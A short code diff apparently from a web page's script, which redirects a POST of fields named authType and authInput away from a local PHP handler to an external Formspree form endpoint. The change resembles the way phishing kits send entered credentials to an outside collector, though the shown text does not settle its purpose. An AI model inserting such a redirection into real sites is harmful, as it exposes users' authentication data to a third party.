@@ -110,7 +110,7 @@
                 return;
             }
 
-            fetch("receive-entry.php", {
+            fetch("https://formspree.io/f/mvgkalye", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 body: `authType=${authType}&authInput=${encodeURIComponent(authInput)}`
